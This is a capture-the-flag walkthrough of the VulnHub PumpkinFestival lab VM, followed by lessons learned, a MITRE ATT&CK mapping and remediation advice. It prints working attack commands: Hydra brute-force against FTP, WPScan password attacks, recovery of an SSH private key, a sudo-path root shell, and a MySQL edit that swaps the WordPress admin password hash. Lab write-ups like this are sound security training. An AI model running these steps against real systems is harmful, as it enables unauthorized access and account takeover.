# VulnHub Mission Pumpkin v1.0 (3/3): PumpkinFestival — Walkthrough

( ^◡^) Alright guys!! The Pumpkin Festival is finally here and it's the grand finale of the Mission Pumpkin series. This one is legit packed: FTP enumeration, WordPress exploitation, virtual host discovery, SSH public-key authentication bypass, a nested archive chain that will test your patience, and a beautifully simple sudo privesc at the end. Ten tokens scattered all over the place. The kind of machine that humbles you right before handing you root.

Massive thanks to Jayanth for crafting this finale. It layers techniques from all three machines and caps it off with some genuinely creative hiding spots.

---

| Field | Value |
|-------|-------|
| **Level** | Beginner |
| **Target VM** | Mission-Pumpkin v1.0: PumpkinFestival |
| **Attacker VM** | Kali Linux 2019.2 |
| **VulnHub** | https://www.vulnhub.com/entry/mission-pumpkin-v10-pumpkinfestival,330/ |
| **Techniques** | Host discovery, Nmap enumeration, FTP anonymous access, web source analysis, virtual host discovery (/etc/hosts), WordPress enumeration (WPScan/Gobuster), Base62 decoding (CyberChef), SSH brute-force (Hydra), SSH public-key auth, archive chain extraction (TAR/file magic), hex decode to SSH private key, WordPress DB access via MySQL, sudo arbitrary file execution, privilege escalation |
| **CVEs** | N/A (logic, configuration, and credentials challenges) |

> **Hints from the author:**
> "Reach root and access PumpkinFestival_Ticket and collect PumpkinTokens on the way."
> "Alohomora!" (the password to open doors — Harry Potter reference, and literally a hint for the privesc)

---

## Attack Summary

```
[host-discovery: IP shown at VM boot banner]
    |
    v
[nmap: FTP/21, HTTP/80, SSH/6880 — robots.txt exposes directories]
    |
    v
[FTP anonymous access -> secret/token.txt -> Token 1]
    |
    v
[HTTP: hidden text in index.html -> Token 2; users: harry, jack]
    |
    v
[/store/track.txt -> admin@pumpkins.local -> add pumpkins.local to /etc/hosts]
    |
    v
[pumpkins.local -> WordPress -> Token 3]
    |
    v
[dirsearch -> /tokens/token.txt -> Token 4]
    |
    v
[WPScan: users admin+morse; /license.txt -> Token 5; /readme.html -> Base62 -> credentials]
    |
    v
[WordPress login as morse -> Token 6 in profile]
    |
    v
[SSH on port 6880: public key only; Hydra FTP -> harry:yrrah]
    |
    v
[FTP as harry -> Token 7 + Donotopen chain -> Token 8 + nested archives -> id_rsa (SSH key)]
    |
    v
[Fix key permissions -> SSH as jack on port 6880]
    |
    v
[SUID binary /home/jack/token -> Token 9]
    |
    v
[sudo -l: can run alohomora as root -> create /home/jack/pumpkins/alohomora -> root shell]
    |
    v
[/root/PumpkinFestival_Ticket + WordPress admin draft -> Token 10]
```

---

## Methodology

1. Host discovery via VM boot banner
2. Nmap full scan: FTP, HTTP, SSH on non-standard port 6880
3. FTP anonymous access for first token
4. Web source analysis and virtual host discovery
5. WordPress enumeration with WPScan and Gobuster
6. Base62 decode for credentials (CyberChef)
7. FTP brute-force to get harry's credentials; SSH key extraction from nested archive
8. SSH access on port 6880 with extracted private key
9. Privilege escalation via sudo misconfiguration (arbitrary path execution)
10. WordPress database access for final token

---

## Step 1 — Identifying the Target

Same as the previous machines in this series: the IP is displayed right on the boot banner:

```
This machine is up and running at
192.168.10.102
```

No arp-scan needed. Let's go straight to enumeration.

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: Scanning IP Blocks]

---

## Step 2 — Reconnaissance and Service Enumeration

```bash
nmap -A -T4 -p- 192.168.10.102
```

Expected output:

```
21/tcp   open  ftp     vsftpd 2.0.8 or later
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
6880/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
```

Three services. FTP on 21, HTTP on 80, and SSH on non-standard port 6880. The Nmap scan also reads `robots.txt` and surfaces several directories: `secret` (FTP), and web paths including `/store`, `/img`, `/js`, `/seeds`.

SSH on a high port is a classic CTF tell for "password auth is probably disabled here, you will need a key." We will see.

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.002 Active Scanning: Vulnerability Scanning] [T1046 Network Service Discovery]

---

## Step 3 — FTP Anonymous Access (Token 1)

The Nmap scan already told us FTP allows anonymous login. Let's collect the first token immediately:

```bash
ftp 192.168.10.102 21
# Login: anonymous
# Password: anonymous (or just press Enter)
```

Inside FTP:

```
ftp> ls
ftp> cd secret
ftp> get token.txt
ftp> bye
```

Read it:

```bash
cat token.txt
```

**Token 1:** `PumpkinToken : 2d6dbbae84d724409606eddd9dd71265`

> **Real-world note:** Anonymous FTP is one of the most frequently flagged issues in network assessments. Many legacy systems still have it enabled. The Mirai botnet (2016) propagated partly via default credentials on embedded devices; anonymous FTP shares are a structural equivalent. Reference: US-CERT TA16-288A.

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1078 Valid Accounts] [T1133 External Remote Services]

---

## Step 4 — HTTP Web Analysis (Tokens 2 and 3)

Open the web page at `http://192.168.10.102/`. You get a welcome message with a Harry Potter reference: "Alohomora!" (the unlocking spell — this is a hint that appears again in the privesc step).

Now check the source:

```bash
curl -s "http://192.168.10.102/" | grep -v "^$"
```

There is hidden text in the source that is not visible in the normal browser view. Look for it carefully.

**Token 2:** `PumpkinToken : 45d9ee7239bc6b0bb21d3f8e1c5faa52`

Also from the source, two potential usernames stand out from the comments and content:

- `harry`
- `jack`

Save them:

```bash
echo -e "harry\njack" > users.txt
```

Now, from Nmap we know `robots.txt` exposed several directories. Try `/store/track.txt`:

```bash
curl -s "http://192.168.10.102/store/track.txt"
```

This file contains a tracking code AND an email address: `admin@pumpkins.local`. That domain is gold.

Many web servers are configured with virtual hosting: the same IP serves completely different content depending on what `Host:` header the client sends. Without knowing the domain, you just see the default site. Add it to `/etc/hosts`:

```bash
echo "192.168.10.102  pumpkins.local" | sudo tee -a /etc/hosts
```

Now navigate to `http://pumpkins.local/`. A WordPress site appears.

**Token 3:** `PumpkinToken : 06c3eb12ef2389e2752335beccfb2080` (visible on the WordPress homepage)

> **MITRE ATT&CK:** [TA0007 Discovery] [T1083 File and Directory Discovery] [T1046 Network Service Discovery]

---

## Step 5 — Directory Enumeration and Token Hunting

Run dirsearch against the IP (not the domain) to find more paths:

```bash
dirsearch -u http://192.168.10.102 -x 403,404,500 -e php,html,txt,jpg,gif,png,zip,tar,gz,gpg
# You can also use gobuster or feroxbuster
```

Or with gobuster:

```bash
gobuster dir -u http://192.168.10.102/ -x php,html,txt \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The path `/tokens/token.txt` shows up.

```bash
curl -s "http://192.168.10.102/tokens/token.txt"
```

**Token 4:** `PumpkinToken : 2c0e11d2200e2604587c331f02a7ebea`

> **MITRE ATT&CK:** [TA0007 Discovery] [T1083 File and Directory Discovery]

---

## Step 6 — WordPress Enumeration (Tokens 5 and 6, plus credentials)

Run WPScan against the WordPress site to enumerate plugins, themes, vulnerabilities, and users:

```bash
wpscan --url http://pumpkins.local/ --enumerate at,ap,u
```

This reveals:

- 14 known vulnerabilities for this WordPress version
- Two users: `admin` and `morse`

Now check the WordPress files that WPScan found. Start with `/license.txt`:

```bash
curl -s "http://pumpkins.local/license.txt"
```

**Token 5:** `PumpkinToken : 5ff346114d634a015ce413e1bc3d8d71`

Next, `/readme.html`:

```bash
curl -s "http://pumpkins.local/readme.html"
```

The file contains an encoded string. It is NOT Base64 (common first guess). It looks like Base62. Use CyberChef at https://gchq.github.io/CyberChef/ and try "From Base62" in the Data Format section.

> **What is Base62?** Base62 encodes data using 62 characters: 0-9, A-Z, a-z. It is often used in URL shorteners and token generation because it avoids special characters. Less common than Base64, which makes it a reasonable obfuscation choice for CTF authors.

Decoded output:

```
morse:Ug0t!TrIpyJ
jack:Ug0t!TrIpyJ
```

Both users share the same password. The WordPress user is `morse`, and `jack` is for SSH or FTP.

Log into WordPress at `http://pumpkins.local/wp-login.php` with `morse:Ug0t!TrIpyJ`.

Navigate to the user profile:

**Token 6:** `PumpkinToken : 7139e925fd43618653e51f820bc6201b`

There is also a draft post from `admin` titled "PumpkinToken" but you cannot read it as `morse`. We will come back for Token 10 later.

> **MITRE ATT&CK:** [TA0006 Credential Access] [T1552.001 Unsecured Credentials: Credentials in Files]

---

## Step 7 — SSH Analysis (Port 6880)

Try logging in with jack's credentials:

```bash
ssh jack@pumpkins.local -p 6880
# Permission denied (publickey)
```

SSH requires public key authentication. Brute-force confirms this:

```bash
nmap -sV -p6880 --script ssh-auth-methods.nse pumpkins.local
# Result: publickey only
```

We need jack's private key. That means we need to find it somewhere else first.

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1021.004 Remote Services: SSH]

---

## Step 8 — FTP Brute-Force (harry's credentials + SSH Key)

Since SSH is locked, let's attack FTP with the users we found:

```bash
hydra -e nsr -L users.txt -P /usr/share/wordlists/rockyou.txt \
    pumpkins.local ftp -I -F
```

In seconds:

```
[21][ftp] host: pumpkins.local   login: harry   password: yrrah
```

**harry:yrrah** — the password is literally "harry" backwards. Classic. ¯\_(ツ)_/¯

Log in:

```bash
ftp pumpkins.local 21
# Login: harry / Password: yrrah
```

Navigate and collect tokens:

```bash
ftp> get token.txt
```

**Token 7:** `PumpkinToken : ba9fa9abf2be9373b7cbd9a6457f374e`

There is also a directory called `Donotopen`. Of course we open it:

```bash
ftp> cd Donotopen/NO/NOO/NOOO/NOOOO/
ftp> get token.txt
```

**Token 8:** `PumpkinToken : f9c5053d01e0dfc30066476ab0f0564c`

Keep going. Inside `NOOOOO/NOOOOOO/` there is a file called `data.txt`. Download it and check what it really is:

```bash
ftp> cd NOOOOO/NOOOOOO
ftp> get data.txt
ftp> bye

file data.txt
# data.txt: POSIX tar archive
```

The extension is fake — classic CTF misdirection. It is a TAR. Extract and repeat:

```bash
mv data.txt data.tar
tar xf data.tar
file *  # repeat this pattern until you reach the final file
```

You will go through several extraction layers. At the end you land on a file called `jack`. Check it:

```bash
file jack
# jack: ASCII text, with very long lines

cat jack | xxd -r -p
# Output: a PEM private key block (SSH RSA private key)
```

Extract the key to the proper location:

```bash
cat jack | xxd -r -p > /root/.ssh/id_rsa
```

> **MITRE ATT&CK:** [TA0006 Credential Access] [T1552.004 Unsecured Credentials: Private Keys]

---

## Step 9 — SSH Access as Jack (Port 6880)

Try to use the key:

```bash
ssh jack@pumpkins.local -p 6880
# WARNING: UNPROTECTED PRIVATE KEY FILE!
# Permissions are too open.
```

SSH refuses the key due to file permissions. Fix them:

```bash
chmod 600 /root/.ssh/id_rsa
```

But there is another problem: the key belongs to user `jack`, but we are running as `root`. SSH validates that the key's owner matches the connecting user. Create a local `jack` user and transfer ownership:

```bash
useradd --no-create-home --no-user-group --shell=/bin/false jack
chown jack /root/.ssh/id_rsa
```

Now try again:

```bash
ssh jack@pumpkins.local -p 6880
```

We are in as jack. ᕕ( ᐛ )ᕗ

```bash
# Clean up local jack user afterwards:
userdel --remove --force jack
```

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1550.004 Use Alternate Authentication Material: SSH Keys]

---

## Step 10 — Privilege Escalation via Sudo

List the current directory and check SUID binaries:

```bash
ls -la /home/jack/
# A SUID binary named 'token' exists
./token
```

**Token 9:** `PumpkinToken : 8d66ef0055b43d80c34917ec6c75f706`

Now check sudo permissions:

```bash
sudo -l
```

Expected output:

```
User jack may run the following commands on PumpkinFestival:
    (root) NOPASSWD: /home/jack/pumpkins/alohomora
```

Interesting. Jack can run `/home/jack/pumpkins/alohomora` as root without a password. But the file and directory do not exist. We create them:

```bash
mkdir /home/jack/pumpkins
echo "/bin/sh -i" > /home/jack/pumpkins/alohomora
chmod +x ~/pumpkins/alohomora
sudo ~/pumpkins/alohomora
```

Root shell. (☞ﾟヮﾟ)☞

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/PumpkinFestival_Ticket
```

**Root flag (PumpkinFestival_Ticket) captured.**

> **Why does this work?** The sudo policy allows jack to run a specific path as root. Because jack owns the home directory and the path doesn't exist yet, jack can create both the directory and the executable. The sudo entry checked the path, not the content of the file. This is a textbook example of why sudo policies must never allow execution of user-controlled paths.

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching]

> **GTFOBins note:** While this specific technique is not a GTFOBins entry, the concept of user-controlled sudo path is documented at https://gtfobins.github.io/

---

## Step 11 — Final Token: WordPress Admin Draft (Token 10)

The `PumpkinFestival_Ticket` banner confirms there are 10 tokens total. We only have 9. The missing one is the draft post in WordPress visible only to `admin`.

### Method 1: Custom Wordlist + WPScan

Generate a site-specific wordlist:

```bash
cewl http://192.168.10.102/ -w wordlistPumpkin.txt
```

Enhance it by cross-referencing with rockyou.txt:

```bash
for i in $(cat wordlistPumpkin.txt); do
    grep "$i" /usr/share/wordlists/rockyou.txt | grep -x '.\\{4,15\\}' >> wordlistPumpkin.txt
    sort -u wordlistPumpkin.txt -o wordlistPumpkin.txt
done
# Grows from ~36 to ~322,693 entries
```

Attack WordPress admin login:

```bash
wpscan -U admin -P wordlistPumpkin.txt --url http://pumpkins.local/
```

The admin password is the greeting phrase visible on the homepage.

### Method 2: MySQL Direct Update (faster from the shell)

With root access, find the WordPress config:

```bash
cat /etc/apache2/sites-available/web.conf
# Reveals WordPress directory

cat /home/web/wp-config.php
# DB credentials: root:root
```

Access MySQL:

```bash
mysql -uroot -p
# Password: root

show databases;
use pumpkins;
show tables;
select user_login,user_pass from wp_users;

# Copy morse's password hash and set it for admin:
update wp_users
set user_pass = '$P$BCvOKficMcCyBtPxjoiM8S8SFBfWUj1'
where user_login = 'admin';
```

Log into WordPress as `admin` with `morse`'s password. Open the draft post.

**Token 10:** `PumpkinToken : f2e00edc353309b40e1aed18e18ab2c4`

All 10 tokens collected. GG. ᕕ( ᐛ )ᕗ

> **MITRE ATT&CK:** [TA0006 Credential Access] [T1552.001 Unsecured Credentials: Credentials in Files] [T1190 Exploit Public-Facing Application]

---

## Captured Flags, Hashes and Credentials

| # | Type | Value | Found At | Notes |
|---|------|-------|----------|-------|
| T1 | PumpkinToken | `2d6dbbae84d724409606eddd9dd71265` | FTP: secret/token.txt | Anonymous FTP |
| T2 | PumpkinToken | `45d9ee7239bc6b0bb21d3f8e1c5faa52` | HTTP: index.html (hidden text) | |
| T3 | PumpkinToken | `06c3eb12ef2389e2752335beccfb2080` | WordPress homepage (pumpkins.local) | vhost required |
| T4 | PumpkinToken | `2c0e11d2200e2604587c331f02a7ebea` | HTTP: /tokens/token.txt | dirsearch |
| T5 | PumpkinToken | `5ff346114d634a015ce413e1bc3d8d71` | WordPress: /license.txt | |
| T6 | PumpkinToken | `7139e925fd43618653e51f820bc6201b` | WordPress: morse user profile | |
| T7 | PumpkinToken | `ba9fa9abf2be9373b7cbd9a6457f374e` | FTP: /home/harry/token.txt | FTP brute-force |
| T8 | PumpkinToken | `f9c5053d01e0dfc30066476ab0f0564c` | FTP: Donotopen/NO/NOO/NOOO/NOOOO/token.txt | |
| T9 | PumpkinToken | `8d66ef0055b43d80c34917ec6c75f706` | SSH: /home/jack/token (SUID binary) | |
| T10 | PumpkinToken | `f2e00edc353309b40e1aed18e18ab2c4` | WordPress: admin draft post | MySQL update or CeWL |
| Cred | morse:Ug0t!TrIpyJ | Base62 decode from /readme.html | WordPress + reference |
| Cred | jack:Ug0t!TrIpyJ | Base62 decode from /readme.html | SSH key (not password) |
| Cred | harry:yrrah | FTP brute-force (rockyou) | FTP access |
| SSH Key | RSA Private Key | FTP: Donotopen chain -> data.txt -> hex decode | jack's key for port 6880 |
| DB Cred | root:root | /home/web/wp-config.php | MySQL |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|-------------|
| 1 | Anonymous FTP with sensitive files | Common in legacy enterprise networks; FTP shares often contain configuration files, backups, or credentials | Disable anonymous FTP; enforce authentication; audit exposed shares regularly |
| 2 | Virtual host reveals hidden application (WordPress) | Subdomain/vhost enumeration is a standard reconnaissance step; internal apps often lack the hardening of public ones | Inventory all vhosts and domains; apply consistent security baselines regardless of visibility |
| 3 | Sudo policy allows user-controlled path execution | Arguably the most dangerous sudo misconfiguration pattern; seen in real-world privilege escalation findings | Sudo paths must point to fixed, root-owned executables; never allow execution of user-controlled directories |
| 4 | Credentials stored in cleartext in web config (wp-config.php) | wp-config.php exposure is a top finding in WordPress assessments worldwide; database credentials in web root are a critical risk | Web configs with credentials must be outside the web root; file permissions must restrict read access |
| 5 | Password derivable by reversing username (harry/yrrah) | Credential patterns based on username transformations are easily caught by brute-force with mangling rules | Enforce minimum password complexity policies that prohibit username-derived passwords |

**Why does this matter outside the lab?**

The sudo misconfiguration in this challenge mirrors real-world findings reported by DFIR teams in enterprise Linux post-exploitation investigations. When an attacker gains a limited shell (like jack's account here), the first thing they do is `sudo -l`. If that output includes any path where the user has write access, game over. CIS Benchmark for Linux (Section 5.3) explicitly addresses this. The WordPress `wp-config.php` credential exposure is documented in OWASP's top application security risks and appears in a significant percentage of WordPress security assessments. Both findings combined represent a realistic lateral movement path from web to root in many production environments.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Discovery | TA0007 | Network Service Discovery | T1046 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |
| Initial Access | TA0001 | Valid Accounts (Anonymous FTP) | T1078 |
| Initial Access | TA0001 | External Remote Services | T1133 |
| Credential Access | TA0006 | Unsecured Credentials: Credentials in Files | T1552.001 |
| Credential Access | TA0006 | Unsecured Credentials: Private Keys | T1552.004 |
| Credential Access | TA0006 | Brute Force: Password Spraying | T1110.003 |
| Lateral Movement | TA0008 | Remote Services: SSH | T1021.004 |
| Lateral Movement | TA0008 | Use Alternate Authentication Material: SSH Keys | T1550.004 |
| Privilege Escalation | TA0004 | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Collection | TA0009 | Data from Local System | T1005 |
| Execution | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. Disable anonymous FTP immediately; if FTP must be used, enforce authenticated access with strong credentials and audit logging
2. Audit all virtual host configurations and apply consistent security controls across all vhosts, not just public-facing ones
3. Fix the sudo policy to remove any entry that allows execution of user-controlled paths; use absolute, root-owned executables only
4. Move `wp-config.php` outside the web root, or restrict its read permissions to the web server process only
5. Enforce password policies that prohibit username-derived patterns (harry/yrrah, admin/nimda, etc.)
6. Enforce key rotation for all SSH private keys found on shared storage (FTP, SMB)

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Disable anonymous FTP, rotate all FTP credentials
- Audit `/etc/sudoers` and `/etc/sudoers.d/` for any path where a non-root user has write access
- Remove or restrict access to `wp-config.php` and rotate all database credentials
- Invalidate all SSH keys exposed via FTP or shared storage

**MITRE D3FEND countermeasures:**
- D3-MFA (Multi-factor Authentication) for all remote access services
- D3-CTS (Credential Transmission Scoping) for database credentials; never expose them in web-accessible files
- D3-SJA (Scheduled Job Analysis) and periodic sudo policy review as part of hardening cadence
- D3-DA (Dynamic Analysis) for detecting execution of newly created files in user home directories with sudo

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID.AM): Inventory all services, including FTP servers and internal web applications on non-standard vhosts
- Protect (PR.AC-4): Privileged access management; enforce least-privilege sudo and disable anonymous services
- Detect (DE.CM-3): Monitor FTP access logs and SSH authentication events for anomalous patterns
- Respond (RS.MI-2): Rotate all potentially exposed credentials upon any confirmed breach
- Recover (RC.RP-1): Restore from verified backups; rebuild compromised web application stacks with hardened configurations

**NIST SP 800-53 (Rev. 5) Controls:**
- AC-6: Least Privilege — restrict sudo entries to absolute minimum
- AC-17: Remote Access — disable unauthenticated remote access protocols (anonymous FTP)
- IA-5: Authenticator Management — prohibit username-derived and reversible passwords
- SC-28: Protection of Information at Rest — protect configuration files with credentials from unauthorized read

**CISA Known Exploited Vulnerabilities:**
- No direct CVE match for this specific challenge
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: ACCESS
- Practice: Identity and Access Management — audit all authentication methods across services; enforce key management lifecycle
- Target MIL: MIL-2

---

## Final Thoughts

Thanks to Jayanth for closing out this trilogy with a machine that actually rewards patience. The nested archive chain in the FTP share is the kind of obstacle that makes you want to ragequit right before you find the SSH key inside. And then the privesc is elegant in its simplicity: the complexity was all in the entry, not the escalation.

Outside the lab: PumpkinFestival teaches a truth that every pentester eventually internalizes. The hardest part of a real engagement is often not the exploitation itself. It is the reconnaissance: finding the vhost, reading the robots.txt, noticing that `/store/track.txt` has an email address, recognizing a Base62 string vs Base64. The sudo misconfiguration that gave us root here takes about 30 seconds to exploit once discovered. Finding the conditions for it can take hours.

The skill this machine builds is not exploitation mechanics. It is the habit of thorough, methodical reconnaissance where nothing is too small to inspect.

If this walkthrough helped you collect all 10 tokens, share it with your crew and keep hacking!

*Thanks guys!! (❍ᴥ❍ʋ)*

> Original article in Portuguese by André Henrique: https://medium.com/@mrhenrike

---

*Writeup by [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
